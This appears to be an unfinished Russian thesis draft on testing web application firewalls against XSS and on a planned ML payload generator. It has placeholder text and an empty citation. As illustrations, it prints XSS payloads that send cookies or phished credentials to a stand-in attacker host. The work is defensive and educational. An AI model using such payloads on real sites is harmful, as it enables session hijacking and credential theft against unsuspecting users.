Это помогает отслеживать, какие запросы были обработаны, блокированы или пропущены, а также какие конкретно данные были вовлечены в обработку. Запись информации о срабатывании правил: Когда WAF обнаруживает подозрительный или вредоносный запрос, информация о срабатывании конкретного правила или сигнатуры заносится в журнал. Это позволяет администратору системы точно определить, какие именно правила сработали при фильтрации трафика и какие угрозы были выявлены. Регистрация атак и попыток обхода: WAF логирует все попытки атак, такие как XSS, SQL-инъекции, а также действия, направленные на обход защиты, например, использование нестандартных кодировок или попытки подмены данных. Эта информация важна для анализа, выявления уязвимостей в настройках системы и разработки новых защитных мер. Контекстная информация для анализа инцидентов: Логирование не ограничивается только записью данных о запросах и ответах. WAF также записывает информацию о контексте атакующих действий, включая IP-адреса источников трафика, типы запросов, используемые методы HTTP и т. д. Это позволяет строить полное представление о том, как была осуществлена атака и какие действия предприняты для её блокировки. Хранение метаданных с временными метками: Все события логируются с точными временными метками, что важно для построения хронологии атак и для анализа поведения системы защиты в различных временных промежутках. Это также помогает в выявлении аномальных или подозрительных паттернов в трафике, таких как высокие частоты запросов из одного источника, характерные для DDoS-атак. Формирование отчетности по событиям безопасности: Логи также используются для генерации отчетов, которые могут быть полезны в процессе  аудита или для расследования инцидентов безопасности. Отчёты могут включать статистику о количестве заблокированных запросов, списки атак, количество ложных срабатываний и другие важные параметры. Логирование является важным инструментом для анализа эффективности работы WAF и для обеспечения прозрачности работы системы безопасности. Без правильного и детализированного логирования невозможно адекватно оценить уровень защиты и своевременно реагировать на инциденты. Ошибки или недостаточная детализация в логах могут затруднить поиск уязвимостей и препятствовать адекватному реагированию на угрозы. Основные модели фильтрации трафика в  WAF Межсетевые экраны веб-приложений используют различные модели фильтрации для анализа и блокировки вредоносных запросов, направленных на веб-приложения. Каждая модель имеет свои особенности и подходит для различных типов угроз и атак. Правильная настройка и выбор модели фильтрации играет ключевую роль в обеспечении надёжной защиты веб-приложений. Далее рассмотрим основные модели фильтрации, применяемые в современных WAF. Сигнатурная фильтрация Сигнатурная модель фильтрации, также известная как «чёрный список», основывается на использовании заранее известных шаблонов атак. В этой модели межсетевой экран анализирует трафик на предмет совпадений с набором заранее определённых сигнатур, которые описывают вредоносные запросы и уязвимости, такие как XSS, SQL-инъекции и другие типичные угрозы. Принцип работы  основан на том, что к аждое правило в сигнатурной модели представляет собой шаблон, который соответствует известному виду атаки. Когда WAF обнаруживает запрос, соответствующий одной из сигнатур, он блокирует или фильтрует этот запрос. Сигнатурная фильтрация  является  основным методом защиты от известных угроз, однако она недостаточна для защиты от новых атак или уникальных техник обхода. Позитивная модель безопасности Позитивная модель фильтрации отличается от сигнатурной тем, что она ориентирована не на блокировку известных угроз, а на разрешение только тех запросов, которые соответствуют заранее установленным правилам безопасности. В этой модели WAF проверяет, соответствуют ли запросы определённым требованиям по формату, типу данных, длине и другим параметрам. Принцип работы  такой : WAF блокирует все запросы, которые не соответствуют заранее определённым нормам или шаблонам. Например, разрешаются только запросы с определённым набором параметров или определённой структурой, что минимизирует риски от атак. Позитивная модель безопасности наиболее эффективна для приложений с чётко структурированными данными и стабильными параметрами, однако её использование в более гибких и динамичных приложениях может быть затруднено. Поведенческая фильтрация Поведенческая модель фильтрации основывается на анализе поведения пользователей и трафика. Вместо того чтобы полагаться на фиксированные сигнатуры или шаблоны, WAF в этой модели отслеживает аномалии и отклонения от нормального поведения, такие как необычные запросы или частые попытки отправки одинаковых данных. Принцип работы  является следующим : WAF обучается на базе данных о нормальном поведении веб-приложения и выявляет отклонения от этого поведения. Если система обнаруживает аномалии, такие как необычное количество запросов или нехарактерные действия пользователя, она блокирует подозрительные запросы. Эта модель фильтрации подходит для защиты от неизвестных атак, но она требует сложной настройки и может быть менее эффективной в средах с высокими нагрузками. Эвристическая фильтрация Эвристическая модель фильтрации использует методы анализа трафика для выявления подозрительных или вредоносных характеристик на основе ранее определённых эвристик. В отличие от сигнатурных моделей, она не полагается на фиксированные шаблоны атак, а находит подозрительные паттерны в данных. Принцип работы: WAF использует набор эвристических алгоритмов для выявления возможных атак, даже если конкретные шаблоны атак ещё не были зафиксированы. Например, эвристики могут отслеживать определённые комбинации символов или частоту запросов, что указывает на возможность атаки. Эвристическая фильтрация часто используется в сочетании с другими методами для повышения гибкости и эффективности защиты. Анализ функций и моделей фильтрации, реализуемых межсетевыми экранами веб-приложений, демонстрирует, что эти системы играют ключевую роль в обеспечении безопасности веб-приложений. Правильная настройка и выбор модели фильтрации являются основой для эффективной защиты от различных типов атак. Сигнатурная фильтрация остаётся основным методом защиты от известных угроз, в то время как позитивная модель безопасности и поведенческий анализ обеспечивают защиту от новых, ранее неизвестных атак. Однако важно учитывать, что каждая модель имеет свои ограничения, и их комбинация может дать наилучший результат в реальных условиях эксплуатации. Все эти функции и модели фильтрации становятся особенно важными в контексте защиты от межсайтового скриптинга (XSS), который является одной из наиболее распространённых угроз для веб-приложений. В следующем разделе  будут рассмотрены  особенности XSS-атак, их виды и механизмы реализации. XSS-атаки как ключевая угроза для веб-приложений и WAF Атаки класса Cross-Site Scripting (XSS) на протяжении длительного времени остаются одной из наиболее распространённых и опасных угроз безопасности веб-приложений. Несмотря на развитие фреймворков, появление современных механизмов экранирования и активное использование WAF, XSS продолжает регулярно входить в перечни критических уязвимостей (OWASP Top 10) и фиксироваться в реальных инцидентах информационной безопасности. Для межсетевых экранов уровня приложений XSS представляет особый интерес, так как именно этот класс атак в наибольшей степени ориентирован на анализ пользовательского ввода и контекста его обработки.   XSS-атаки позволяют злоумышленникам внедрить вредоносный JavaScript-код в веб-страницу, которая будет исполнена в браузере пользователя, что нарушает основные принципы безопасности, такие как политика одного источника. Суть XSS-атаки заключается в том, что злоумышленник использует уязвимости в веб-приложении для внедрения вредоносного скрипта в контекст доверенного веб-ресурса. Когда жертва посещает страницу, браузер выполняет этот скрипт с теми же правами, что и законный код веб-приложения, что позволяет атакующему выполнить несанкционированные действия, такие как: к ража сессионных данных (cookies, токены авторизации), что может привести к захвату сессии пользователя. п ерехват личной информации или изменение данных, введённых пользователем. м анипуляции с DOM-структурой страницы (например, изменение содержимого страницы, отправка фальшивых запросов от имени пользователя). р азмещение фишинговых форм для сбора учётных данных. Механизм XSS-атаки состоит из нескольких ключевых этапов: Поиск точки внедрения:   з лоумышленник находит параметр или участок веб-страницы, который позволяет вставить пользовательские данные без должной валидации и экранирования. Это может быть форма ввода, URL-параметр или даже заголовки HTTP-запросов. Формирование полезной нагрузки:   с оздаётся вредоносный JavaScript-код, который может быть исполнен в браузере жертвы. Это может быть простой скрипт или сложная цепочка команд, использующая уязвимости в веб-приложении. Доставка полезной нагрузки:   в редоносный код передаётся через веб-страницу или запрос, попадает в приложение и сохраняется или непосредственно исполняется на странице. Интерпретация браузером:   п осле того как страница загружается в браузере пользователя, код исполняется с теми же правами, что и законный код страницы. Это позволяет атакующему выполнить любые действия, которые не могут быть замечены пользователем. Реализация целей атакующего:  В зависимости от задачи атакующего, вредоносный код может захватить сессию пользователя, отправить личные данные на сторонний сервер или выполнить другие несанкционированные действия. XSS-атаки остаются актуальной угрозой для веб-приложений, поскольку их легко реализовать, а последствия могут быть очень серьёзными. В следующем подразделе рассмотр енны  различные типы XSS-атак, их классификац ия  и особенности эксплуатации в реальных условиях. Классификация  XSS- атак В зависимости от того, как именно происходит внедрение и исполнение вредоносного кода, можно выделить несколько типов XSS-атак, каждый из которых требует различных методов защиты и обнаружения. ВСТАВИТЬ ТИПЫ  Отраженная  XSS (Reflected XSS) Отражённая XSS — это одна из наиболее простых и часто используемых атак, которая направлена на мгновенное выполнение вредоносного кода в браузере пользователя. В отличие от других типов XSS, отражённая атака не сохраняет вредоносный код на сервере, а передаёт его сразу через запрос, который затем немедленно отображается в ответе сервера. В случае отражённой XSS злоумышленник вставляет вредоносный код в один из параметров запроса, таких как URL-параметры, данные формы или заголовки HTTP-запроса. Когда веб-приложение обрабатывает запрос, оно возвращает эти данные в ответе, при этом не проводя должной фильтрации. В результате вредоносный JavaScript-код, вставленный в запрос, исполняется в браузере пользователя , что может привести к кражи данных или выполнению несанкционированных действий . Например, злоумышленник может создать ссылку с вредоносным кодом в URL-параметре: http://example.com/?search = <script>document.location='http://malicious-site.com/steal-cookies?cookie='+ document.cookie;</script>   При переходе по этой ссылке  cookies текущего   пользователя  будут отправлены  на внешний сервер злоумышленника , что может привести к захвату сесси и . Отражённые XSS-атаки очень просты в реализации. Злоумышленнику достаточно вставить вредоносный код в URL или другой передаваемый параметр, и он сразу будет исполнен в браузере пользователя. Эта атака не требует сохранения данных на сервере, что делает её очень удобной для фишинга или социальной инженерии. Отражённые XSS-атаки могут быть сложными для защиты с помощью сигнатурных WAF, поскольку злоумышленник может использовать нестандартное кодирование или манипуляции с параметрами. Такие запросы  могут не быть идентифицированы как вредоносные, если WAF не настроен для обработки всех возможных вариантов кодирования и параметрических манипуляций. Хранимая XSS (Stored XSS) Хранимая XSS является гораздо более опасной и разрушительной атакой по сравнению с отражённой. В отличие от отражённой атаки, где вредоносный код внедряется и исполняется непосредственно в запросе, хранимая XSS сохраняет код на сервере, а затем он автоматически выполняется каждый раз, когда другие пользователи посещают заражённую страницу. Злоумышленник передаёт вредоносный код через форму, комментарии или другие данные, которые сохраняются на сервере (например, в базе данных). Когда другие пользователи заходят на страницу, содержащую эти данные, вредоносный код автоматически исполняется в их браузерах. Это может происходить как в текстовых полях, так и в различных элементах страницы, таких как комментарии, профили или сообщения. Например, пользователь оставил такое сообщение на форуме: Всем привет, как вы считаете, куда лучше вкладываться: в золото, серебро или нефть?   <script>   document.body.innerHTML = '<h1> Ошибка !  Ваш   аккаунт   заблокирован </h1><p> Для   восстановления   доступа ,  пожалуйста ,  введите   свой   логин   и   пароль :</p><form action="http://malicious-site.com/steal-creds" method="POST"><input type="text" name="username"><input type="password" name="password"><input type="submit" value=" Отправить "></form>'; </script> Этот код будет сохранён на сервере и отображён для всех посетителей страницы, что приведёт к выполнению скрипта в их браузере.  В момент загрузки сайта,  содержимое страницы  изменится на  фальшивое сообщение, убеждая пользователя в том, что его аккаунт заблокирован. Появляется форма для ввода логина и пароля, и эти данные отправляются на сервер злоумышленника. Хранимая XSS даёт злоумышленнику возможность воздействовать на всех пользователей веб-приложения, получающих доступ к заражённой странице. После того как вредоносный код был внедрён, он может выполняться многократно, воздействуя на всех пользователей, без необходимости повторной атаки с участием атакующего. Хранимая XSS представляет собой сложную задачу для защиты, так как WAF должен анализировать все данные, которые могут быть сохранены на сервере. Это включает не только проверку входящих запросов, но и фильтрацию данных, которые будут переданы другим пользователям. Правильная настройка фильтрации на сервере и при выводе данных на страницу является важным этапом защиты от хранимой XSS. DOM-ориентированная XSS (DOM-based XSS) DOM-ориентированная XSS является одной из самых сложных и изощрённых атак, поскольку она полностью зависит от работы на стороне клиента. В отличие от отражённой и хранимой XSS, где вредоносный код или данные передаются через сервер, DOM-ориентированная атака происходит исключительно в браузере жертвы и использует уязвимости в обработке данных на клиентской стороне. Злоумышленник внедряет вредоносный код в параметры URL или другие источники данных, которые затем используются клиентским JavaScript для изменения DOM-структуры веб-страницы. Когда пользователь переходит по вредоносной ссылке, скрипт выполняется на стороне клиента, и вредоносный код начинает воздействовать на страницу. Важно, что эта атака не требует  вмешательства на сервере и проходит незаметно для традиционных WAF, так как код выполняется непосредственно в браузере. Например, представьте, что на веб-странице есть форма, которая принимает данные из URL-параметра и динамически вставляет их на страницу. Если JavaScript на стороне клиента не экранирует данные из URL, злоумышленник может внедрить вредоносный код в параметр URL, который потом будет исполнен в браузере. Пример : http://example.com/profile # id=<script>document.location='http://malicious-site.com/steal-cookies?cookie=' + document.cookie;</script> В данном случае, скрипт, встроенный в URL-параметр id, заставляет браузер выполнить вредоносный код, который отправляет cookies пользователя на внешний сервер злоумышленника. Этот код будет выполнен только после того, как жертва откроет ссылку. DOM-ориентированная XSS не требует вмешательства со стороны сервера, поскольку атака происходит на клиентской стороне, когда браузер обрабатывает и отображает страницу. Она может воздействовать только на тех пользователей, которые посетят заражённую ссылку. Однако, при массовом распространении таких ссылок, влияние на безопасность может быть значительно. DOM-ориентированная XSS представляет собой сложную задачу для защиты, так как она не затрагивает сервер, и традиционные методы фильтрации запросов не могут быть использованы для её предотвращения. Для защиты от таких атак необходимо тщательно контролировать все данные, которые браузер использует для манипуляций с DOM. Анализ методов тестирования защиты от XSS-атак Защита веб-приложений от XSS-атак является важной составляющей обеспечения безопасности, и успешное тестирование системы защиты требует использования разнообразных методов. Разработка и внедрение эффективных механизмов защиты от XSS требуют тщательного тестирования, направленного на выявление уязвимостей, которые могут быть использованы злоумышленниками для выполнения вредоносного JavaScript-кода в браузере пользователя. Для этого используются различные методы и подходы, которые позволяют на разных этапах разработки и эксплуатации приложения проверять его защиту. Методы тестирования могут варьироваться от ручного тестирования и использования автоматизированных инструментов до более сложных проверок, направленных на выявление уязвимостей. Эти подходы имеют свои особенности, преимущества и ограничения, и в совокупности они обеспечивают наиболее полное покрытие тестируемых сценариев. В данном разделе мы рассмотрим основные методы тестирования защиты от XSS-атак, их сильные и слабые стороны, а также предложим подходы для их эффективного применения. Ручное тестирование Ручное тестирование остаётся одним из наиболее эффективных методов обнаружения XSS-уязвимостей, несмотря на развитие автоматизированных инструментов. Этот подход заключается в том, что специалисты по безопасности вручную внедряют вредоносные скрипты в различные точки веб-приложения, такие как формы, URL-параметры, заголовки HTTP и другие пользовательские вводы, и проверяют, как система реагирует на эти данные. Ручное тестирование XSS-уязвимостей включает несколько ключевых этапов: Идентификация точек ввода данных:  т естировщик сначала определяет все возможные места в веб-приложении, где пользователи могут  вводить данные. Это могут быть поля форм, параметры URL, заголовки HTTP-запросов, куки, и любые другие входные данные, которые могут быть обработаны веб-приложением. Внедрение вредоносных пейлоадов:  п осле того как тестировщик определил точки ввода данных, он внедряет различные XSS-пейлоады — вредоносные скрипты, предназначенные для тестирования уязвимости. Например, простые пейлоады, такие как <script>alert('XSS')</script>, могут быть использованы для проверки базовых уязвимостей. Более сложные пейлоады могут включать попытки кражи cookies или выполнения фишинговых атак. Наблюдение за поведением веб-приложения:  в ажно внимательно наблюдать за тем, как веб-приложение реагирует на внедрённый вредоносный код. Если код исполнился в браузере (например, сработал alert или данные были отправлены на сервер злоумышленника), это означает, что веб-приложение уязвимо для XSS-атак. Тестирование различных типов XSS-атак: Тестировщик должен протестировать различные виды XSS-атак, такие как отражённая, хранимая и DOM-ориентированная XSS, чтобы удостовериться, что защита работает во всех сценариях. Особенно важно проверять нестандартные техники обхода фильтрации, такие как многократное кодирование, использование нестандартных символов и манипуляции с параметрами. Документация уязвимостей:  п осле тестирования важно задокументировать все обнаруженные уязвимости, указав точные параметры, которые привели к уязвимости, а также методы, с помощью которых атака была выполнена. Это поможет разработчикам правильно устранить проблему и избежать её в будущем. Ручное тестирование имеет несколько значительных преимуществ. Оно предоставляет высокую гибкость и точность, позволяя тестировщику адаптировать подходы под специфические особенности веб-приложения. Это особенно важно, когда необходимо протестировать сложные или нестандартные  уязвимости, такие как DOM-ориентированные XSS-атаки, которые могут быть трудны для автоматических инструментов. Ручное тестирование позволяет более эффективно воссоздавать реальные атаки и учитывать контекст работы приложения, что повышает вероятность обнаружения уязвимостей, которых можно было бы не заметить с помощью автоматизированных систем. Также оно дает возможность более детально проанализировать каждый этап взаимодействия пользователя с веб-приложением. Однако, у ручного тестирования есть и ограничения. Это трудоёмкий процесс, который требует значительных временных затрат, особенно для крупных и сложных веб-приложений. Каждый элемент приложения должен быть протестирован вручную, что может занять много времени. Кроме того, эффективность ручного тестирования напрямую зависит от опыта и квалификации тестировщика. Ошибки или недооценка потенциальных угроз могут привести к пропуску важных уязвимостей. Вдобавок, несмотря на большую гибкость, ручное тестирование не всегда может охватить все возможные уязвимости и сценарии атак, что ограничивает его масштабы и снижает полноту проверки. Автоматизированные методы тестирования Автоматизированные методы тестирования XSS-уязвимостей становятся всё более популярными благодаря своей скорости и способности обрабатывать большие объёмы данных. Эти методы основаны на использовании специализированных инструментов, которые автоматически сканируют веб-приложение на наличие уязвимостей, включая XSS. Основное преимущество автоматизированных тестов заключается в том, что они позволяют быстро проводить проверку множества параметров и форм на наличие известных типов атак, что значительно ускоряет процесс тестирования. Автоматизированные инструменты, такие как OWASP ZAP, Burp Suite и XSSer, могут сканировать веб-приложения, автоматически выявлять и внедрять различные пейлоады, имитируя атаки на основе известных угроз. Эти  инструменты поддерживают базовые и более сложные техники атак, что позволяет тестировать как простые, так и нестандартные XSS-уязвимости. Они могут выполнять проверки на наличие отражённых и хранимых XSS-уязвимостей, а также использовать более сложные методы, такие как перехват данных сессий или кража cookies. Одним из ключевых преимуществ автоматизированных методов является высокая скорость тестирования. Инструменты могут обрабатывать большое количество запросов и данных за короткое время, что позволяет быстро оценить уровень безопасности веб-приложения. Это особенно полезно в условиях интенсивной разработки, когда необходимо часто проверять новый функционал. Кроме того, автоматизация позволяет систематически проверять все части веб-приложения, включая те, которые могут быть пропущены при ручном тестировании, например, скрытые формы или параметры, передаваемые через HTTP-заголовки. Она также помогает в отслеживании изменений в приложении, проводя регулярные сканирования и фиксируя потенциальные новые уязвимости. Однако у автоматизированных методов есть и ограничения. Основное из них — это неспособность эффективно обнаруживать более сложные и уникальные атаки, такие как DOM-ориентированная XSS. Такие атаки происходят на стороне клиента и могут быть не видны для автоматических сканеров, так как они не всегда способны анализировать клиентский JavaScript и динамически изменяемый DOM. Кроме того, автоматизированные инструменты могут генерировать ложные срабатывания, если их настройки не соответствуют специфике приложения, что иногда приводит к ошибочной блокировке или пропуску уязвимостей. Тем не менее, сочетание автоматизированных методов с ручным тестированием позволяет значительно улучшить эффективность процесса тестирования. Автоматизация помогает быстро выявить основные уязвимости, оставляя ручному тестировщику задачу поиска более сложных и тонких угроз. OWASP ZAP (Zed Attack Proxy) OWASP ZAP это один из самых популярных и мощных инструментов для автоматического тестирования безопасности веб-приложений. Он является бесплатным и с открытым исходным кодом, что делает его доступным для широкого круга разработчиков и специалистов по безопасности. ZAP предоставляет функционал для автоматического сканирования веб-приложений на наличие различных уязвимостей, включая XSS. Он использует как базовые, так и продвинутые методы для поиска и эксплуатации уязвимостей. ZAP также поддерживает перехват HTTP-запросов и ответов, что позволяет анализировать и модифицировать трафик в реальном времени. ZAP предлагает широкий спектр функций, включая автоматическое сканирование, ручное тестирование с прокси-сервером, а также различные плагины для дополнительной функциональности. Инструмент имеет простоту использования и хорошо подходит как для новичков, так и для опытных специалистов. Он активно поддерживается и обновляется сообществом OWASP. Burp-Suite Burp Suite   также является  для тестирования веб-приложений. Он предоставляет комплексный набор инструментов для сканирования, анализа и эксплуатации уязвимостей, включая XSS. В  Burp Suite вклю чено  в себя множество инструментов, таких как Proxy, Scanner, Intruder и Repeater, которые помогают автоматизировать процесс тестирования безопасности. Инструмент позволяет перехватывать и изменять трафик между браузером и сервером, а также автоматизировать обнаружение XSS, SQL-инъекций и других уязвимостей. Burp Scanner автоматически ищет XSS-уязвимости в приложении, используя несколько типов пейлоадов и методов атак. Burp Suite предлагает гибкость и мощность, подходящие для профессиональных тестировщиков. Он имеет продвинутую систему отчетности, возможности для перехвата и модификации запросов, а также поддержку  настроек для тестирования на проникновение и создания пользовательских пейлоадов.  Однако, он  является коммерческим инструментом с ограничениями в бесплатной версии. Полный доступ к функционалу доступен только в платной версии, что может быть ограничением для малых организаций или индивидуальных разработчиков. Кроме того, настройка и использование всех возможностей Burp Suite требует времени и опыта. XSSer XSSer это специализированный инструмент для автоматического поиска и эксплуатации XSS-уязвимостей в веб-приложениях. В отличие от более универсальных решений, таких как Burp Suite, XSSer фокусируется исключительно на XSS, что делает его удобным и эффективным инструментом для обнаружения и эксплуатации именно этого типа уязвимостей. XSSer работает с помощью различных техник атак, включая проверку URL-параметров, данных формы и других точек ввода на наличие уязвимостей. Он использует большое количество предустановленных пейлоадов для выявления XSS, а также предоставляет возможность создания кастомных пейлоадов для более специфичных сценариев. XSSer позволяет автоматически проводить сканирование веб-приложений, пытаясь внедрить вредоносные скрипты в данные, передаваемые пользователями, и проверяет, как приложение обрабатывает эти данные.   Его основные функции это: Автоматическое сканирование веб-приложений на наличие XSS-уязвимостей. Поддержка различных типов атак, включая отражённые, хранимые и DOM-ориентированные XSS. Многообразие встроенных пейлоадов для тестирования, а также возможность добавления собственных. Генерация отчётов о найденных уязвимостях. Инструмент для эксплуатации уязвимостей и выполнения атак с целью демонстрации уязвимости. XSSer имеет несколько значительных преимуществ. Он является специализированным инструментом для автоматического поиска XSS-уязвимостей, что делает его удобным и эффективным для именно этого типа атак. Инструмент предлагает широкий набор предустановленных пейлоадов, что позволяет быстро проверять приложение на наличие различных видов XSS, включая отражённые, хранимые и DOM-ориентированные. Это делает XSSer идеальным выбором для ситуаций, когда требуется сосредоточиться исключительно на защите от XSS-угроз. Его интерфейс прост в использовании и подходит как для новичков, так и для более опытных специалистов, что повышает доступность инструмента для широкого круга пользователей. Кроме того, XSSer предоставляет возможность интеграции с другими инструментами, что расширяет его функциональность. Однако у XSSer есть и ограничения. Прежде всего, его функциональность ограничена исключительно XSS-уязвимостями, в отличие от более универсальных инструментов, которые могут тестировать гораздо более широкий спектр уязвимостей. Хотя XSSer предоставляет различные методы тестирования, некоторые сложные формы защиты, такие как защитные механизмы на уровне серверных фильтров или нестандартные подходы к экранированию данных, могут быть легко обойдены. Инструмент также не поддерживает такие расширенные методы защиты и тестирования, как другие более комплексные решения, что может стать проблемой при необходимости протестировать более сложные или нестандартные уязвимости. Недостатки существующих решений Несмотря на свою популярность и широкие возможности, инструменты, такие как Burp Suite, XSSer и OWASP ZAP, имеют несколько обобщённых недостатков, которые ограничивают их эффективность, особенно в контексте динамических атак и новаторских техник. Одним из главных ограничений этих инструментов является отсутствие использования машинного обучения (ML) для генерации пейлоадов и адаптации к новым угрозам. Burp Suite, например, использует заранее определённые пейлоады и сигнатуры для поиска XSS-уязвимостей. Это ограничивает его способность генерировать уникальные пейлоады или адаптировать атаки в реальном времени на основе поведения веб-приложения. Такой подход эффективен против известных угроз, но не способен обнаружить новые или нестандартные способы обхода защиты, поскольку генерируемые атаки ограничены набором фиксированных шаблонов. XSSer также ориентирован на использование стандартных пейлоадов для проверки XSS-уязвимостей. Этот инструмент быстро и эффективно находит уязвимости, но его функциональность ограничена заранее подготовленными атаками, что делает его менее гибким в условиях появления новых техник и методов обхода защиты. В отличие от этого, использование машинного обучения могло бы значительно улучшить процесс тестирования, позволяя генерировать и адаптировать пейлоады на основе анализа поведения веб-приложения, что повышает вероятность обнаружения сложных и скрытых уязвимостей. OWASP ZAP, несмотря на свою мощность и гибкость, также не использует машинное обучение для генерации пейлоадов или анализа новых атак. Хотя ZAP предоставляет возможность автоматического сканирования и перехвата трафика, его подход ограничен использованием заранее подготовленных пейлоадов и сигнатур, что снижает его способность к адаптации и созданию уникальных атак на основе поведения веб-приложения. Хотя ZAP и предлагает возможности для динамического тестирования, это всё же не позволяет ему быть столь гибким, как инструмент, использующий машинное обучение для создания атак. Главное отличие  разрабатываемого в рамках данного дипломного проекта  заключается в том, что  созданный  инструмент будет использовать ML генератор для создания адаптивных и уникальных пейлоадов. В отличие от существующих решений,  это  приложение сможет  « учиться »  на основе анализа новых данных, а также на основе успешных и неудачных атак, подстраиваясь под конкретные особенности веб-приложений. Это откроет новые возможности для обнаружения  нестандартных XSS-уязвимостей, которые традиционные инструменты могут пропустить. ТЕХНИЧЕСКОЕ ЗАДАНИЕ Техническое задание подготовлено в соответствии с требованиями к оформлению и содержанию, установленными ГОСТ 19.201-78 «Единая система программной документации. Техническое задание. Требования к содержанию и оформлени ю»   [] . Введение Настоящее техническое задание описывает разработку специализированного инструментария для тестирования межсетевых экранов веб-приложений (WAF) на устойчивость к XSS-атакам в рамках дипломного проекта. Данный инструментарий предназначен для комплексной оценки эффективности систем защиты веб-приложений путем генерации и выполнения разнообразных тестовых сценариев XSS-атак, с целью выявления уязвимостей в защите от межсайтового скриптинга и других типов атак на веб-приложения. Основания для разработки Необходимость разработки специализированного инструментария обусловлена продолжающейся высокой распространённостью атак типа XSS, которые занимают одну из лидирующих позиций в рейтингах киберугроз согласно отчетам OWASP Top 10 и статистике ведущих разработчиков средств защиты. Дополнительным фактором является отсутствие специализированных решений, ориентированных на оценку устойчивости WAF к современным техникам обхода защиты от XSS-атак. Это включает в себя использование ML-генерации пейлоадов для создания уникальных, адаптируемых атак , а также  эксплуатацию уязвимостей в протоколах и механизмах веб-приложений. Назначение разработки Цель разработки — создание комплексного инструментария для тестирования межсетевого экрана WAF на устойчивость к XSS-атакам, который обеспечит автоматизированную оценку систем защиты. Это будет достигаться за  счёт использования машинного обучения для генерации разнообразных тестовых полезных нагрузок. Также инструмент будет анализировать ответы WAF и генерировать детализированные отчёты о результатах тестирования, что позволит более эффективно выявлять уязвимости и обходы защиты. Требования к программе или программному изделию Требования к функциональным характеристикам Инстр ументы  тестирования WAF долж ны  обеспечивать следующие функции: Генерация тестовых XSS-пейлоадов различных типов с использованием машинного обучения (ML) для динамической мутации и адаптации атак. Отправка тестовых запросов к   WAF. Анализ ответов межсетевого экрана. Формирование отчетов о результатах тестирования с описанием уязвимостей. Требования к надёжности Надёжность системы обеспечивается следующим: Воспроизводимость результатов тестирования:  п овторное тестирование с аналогичными результатами должно выдавать отчёт, идентичный предыдущему, что гарантирует стабильность и точность инструментов генерации и тестирования. Устойчивость к сбоям: Инструмент должен сохранять работоспособность при недоступности целевых систем и сетевых сбоях, с возможностью продолжить тестирование после восстановления соединения. Контроль нагрузки: Инструмент должен быть настроен на ограниченную частоту запросов, чтобы избежать перегрузки целевых систем, что особенно важно при проведении интенсивных тестов с использованием ML-генерации пейлоадов. Условия эксплуатации Требования к видам обслуживания: Регулярное обновление базы тестовых полезных нагрузок, включая новые пейлоады, генерируемые с использованием машинного обучения. Обновление программного обеспечения инструмента для обеспечения поддержки новых техник обхода и пейлоадов. Требования к численности и квалификации персонала: Специалист по информационной безопасности с опытом работы с инструментами тестирования WAF и пониманием принципов машинного обучения. Знание основ веб-безопасности и XSS-атак. Требования к составу и параметрам технических средств Для разработки и эксплуатации инструмента потребуется: Персональный компьюте р . Операционная система Windows 11 . Оперативная память 16 ГБ для запуска интенсивных тестов). 8 - и  ядерный процессор. Стабильное интернет-соединение. Дисковое пространство не менее 20 ГБ. Для программного обеспечения требуется: Python версии 3.8 и выше с установленными библиотеками: requests — для отправки HTTP-запросов. beautifulsoup4 — для анализа HTML-ответов. urllib3 — для работы с URL. colorama — для цветного вывода в консоль. pyyaml — для работы с конфигурационными файлами. tensorflow/keras/pytorch — для реализации и обучения модели машинного обучения. Требования к информационной и программной совместимости Совместимость с   Python  версии 3.8 и выше. Поддержка операционных систем семейства  Window s . Совместимость с популярными   WAF . Поддержка современных стандартов  HTTP/HTTPS . Требования к маркировке и упаковке Требования к маркировке и упаковке не предъявляются, так как программное обеспечение распространяется в электронном виде. Требования к транспортировке и хранению Защищённое хранение конфигураций и результатов тестирования. Специальные требования Тестирование инструмента исключительно в тестовых средах. Запрещается применение инструмента в отношении систем без явного разрешения владельцев. Изоляция тестового стенда от продуктивных сетей. Соблюдение законодательства в области информационной безопасности. Требования к программной документации Документация для разрабатываемого инструмента должна быть подготовлена в соответствии с ГОСТ 19.101-77 и включать следующие элементы: Техническое задание  Программу и методику испытаний  Руководство пользователя  Отчёт о проведённых испытаниях Исходный код программы Технико-экономические показатели Внедрение разработанного инструмента для тестирования WAF на устойчивость к XSS-атакам позволит достичь следующих результатов: Систематизация процесса тестирования: Инструмент позволит структурировать процесс тестирования WAF, обеспечивая комплексный подход к проверке на устойчивость как к стандартным, так и новым методам XSS-атак, включая генерацию адаптивных пейлоадов с использованием машинного обучения. Снижение рисков успешных атак: Установка системы тестирования способствует выявлению и устранению уязвимостей на ранних стадиях, что значительно снижает вероятность успешных кибератак на веб-приложения. Повышение уровня защищенности: Инструмент помогает своевременно выявить слабые места в конфигурации WAF, что способствует повышению уровня защиты веб-приложений от XSS-атак. Снижение затрат: Разработка и использование собственного инструмента для тестирования WAF снижает затраты на приобретение и обслуживание коммерческих решений для тестирования безопасности. Стадии и этапы разработки Стадии и этапы разработки инструмента для тестирования WAF на устойчивость к XSS-атакам включают: Исследование предметной области — анализ современных методов защиты от XSS и методов обхода WAF. Разработка и утверждение технического задания — определение функциональных требований, выбор архитектуры и инструментов для разработки. Проектирование архитектуры системы — разработка структуры инструментов: генератор пейлоадов, модуль отправки запросов, модуль анализа ответов и формирования отчетов. Реализация — разработка всех компонентов системы, включая ML-генератор пейлоадов и систему тестирования. Тестирование системы — выполнение функциональных и нагрузочных тестов, проверка корректности работы инструмента на реальных примерах WAF. Обучение персонала — обучение специалистов по информационной безопасности работе с инструментом и проведению тестирования. Порядок контроля и приемки Виды испытаний Функциональное тестирование: проверка работоспособности всех компонентов системы, включая генерацию полезных нагрузок, отправку запросов и анализ ответов. Нагрузочное тестирование: оценка производительности при одновременном тестировании нескольких межсетевых экранов WAF. Тестирование безопасности: проверка корректности обработки ошибок и устойчивости системы к исключительным ситуациям. Сравнительное тестирование: сравнение результатов работы инструмента с существующими аналогами, такими как Burp Suite, OWASP ZAP и другими коммерческими решениями. Общие требования к приемке работы Система считается принятой после успешного прохождения всех видов испытаний. Результаты испытаний фиксируются в протоколах и утверждаются ответственными лицами. После приемки система передается в эксплуатацию с полным комплектом документации. ЭЛЕМЕНТЫ ТЕХНИЧЕСКОГО ПРОЕКТА Пупупу ЭКОНОМИЧЕСКОЕ ОБОСНОВАНИЕ Расчет экономической эффективности разработки инструментария для тестирования межсетевого экрана WAF Внедрение разработанного специализированного инструментария для тестирования межсетевых экранов веб-приложений (WAF) на устойчивость к XSS-атакам, с использованием машинного обучения для генерации пейлоадов, является не только техническим усовершенствованием, но и инвестицией в информационную безопасность компании. Цель данного 